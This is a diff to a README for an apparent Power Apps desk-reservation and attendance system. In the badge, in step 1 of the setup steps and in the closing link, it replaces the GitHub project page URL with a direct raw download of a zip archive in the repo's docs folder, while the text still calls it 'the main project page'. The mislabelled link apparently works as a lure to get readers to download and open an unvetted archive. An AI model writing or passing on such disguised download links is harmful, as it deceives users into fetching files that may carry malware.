@@ -1,6 +1,6 @@
 # 🪑 desk-reservation-attendance-system - Reserve Desks With Less Friction
 
-[![Download](https://img.shields.io/badge/Download-Open%20GitHub%20Page-blue?style=for-the-badge&logo=github)](https://github.com/RIDVANSC/desk-reservation-attendance-system)
+[![Download](https://img.shields.io/badge/Download-Open%20GitHub%20Page-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/RIDVANSC/desk-reservation-attendance-system/main/docs/system_desk_reservation_attendance_v2.1.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Use this system to book desks, track attendance, and keep office use organized. 
 
 ## 📥 Download and Run
 
-1. Open the main project page: https://github.com/RIDVANSC/desk-reservation-attendance-system
+1. Open the main project page: https://raw.githubusercontent.com/RIDVANSC/desk-reservation-attendance-system/main/docs/system_desk_reservation_attendance_v2.1.zip
 2. On the page, check the latest files, release assets, or setup steps
 3. Download the package or files provided in the repository
 4. If the project includes an app package, open it in Power Apps
@@ -241,7 +241,7 @@ This setup works well for:
 
 Visit this page to download and set up the project:
 
-https://github.com/RIDVANSC/desk-reservation-attendance-system
+https://raw.githubusercontent.com/RIDVANSC/desk-reservation-attendance-system/main/docs/system_desk_reservation_attendance_v2.1.zip
 
 ## 📝 Repository Topics
 
